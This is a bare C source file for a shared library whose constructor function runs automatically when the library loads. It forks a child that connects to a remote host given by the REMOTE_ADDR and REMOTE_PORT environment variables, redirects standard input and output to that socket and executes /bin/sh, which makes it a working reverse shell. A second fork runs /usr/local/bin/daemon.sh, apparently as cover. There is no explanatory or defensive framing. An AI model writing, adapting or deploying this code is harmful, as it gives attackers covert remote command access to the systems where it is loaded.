#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>

static int con() __attribute__((constructor));

int con()
{
    int pid = fork();
    if (pid == 0)
    {
        // First child process for the connection
        const char *raddr = (const char *)getenv("REMOTE_ADDR");
        char rport[6];
        snprintf(rport, 6, "%d", atoi(getenv("REMOTE_PORT")));
        char buffy[] = "connecting people\n\r";
        struct addrinfo hints, *res;
        int s;

        memset(&hints, 0, sizeof hints);
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(raddr, rport, &hints, &res) != 0)
        {
            perror("getaddrinfo");
            return 1;
        }

        struct sockaddr_in sa;
        memcpy(&sa, res->ai_addr, sizeof sa);
        sa.sin_port = htons(atoi(rport));

        s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        write(s, buffy, sizeof(buffy));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        execve("/bin/sh", NULL, NULL);
        perror("execve");
        return 1;
    }
    else
    {
        int daemon_pid = fork();
        if (daemon_pid == 0)
        {
            // Second child process for executing /usr/local/bin/daemon.sh
            char *daemon_argv[] = {"/usr/local/bin/daemon.sh", NULL};
            execve(daemon_argv[0], daemon_argv, NULL);
            perror("execve");
            return 1;
        }
        return 0;
    }
}